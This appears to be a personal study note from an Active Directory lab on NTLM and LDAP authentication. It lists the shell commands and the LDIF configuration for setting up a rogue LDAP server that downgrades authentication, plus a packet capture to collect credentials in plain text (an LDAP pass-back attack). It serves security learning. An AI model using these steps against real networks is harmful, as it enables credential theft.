#windows #active 
# NTLM Authenticated service


NTLM and NetNTLM  

New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM


- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.


  
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png)


# LDAP Blind Creds


LDAP  

Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.


## What is LDAP Pass-Back Attack


*commonds to create an rogue LDAP Server that revices creds in Plain Text

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

```
sudo dpkg-reconfigure -p low slapd
```

`NO`

`MDB`

`NO`

`YES` iif asked

```
file name = olcSaslSecProps.ldif

#olcSaslSecProps.ldif 
dn: cn=config 
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

- **olcSaslSecProps:** Specifies the SASL security properties
- **noanonymous:** Disables mechanisms that support anonymous login
- **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

```
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

```
sudo tcpdump -SX -i breachad tcp port 389
```


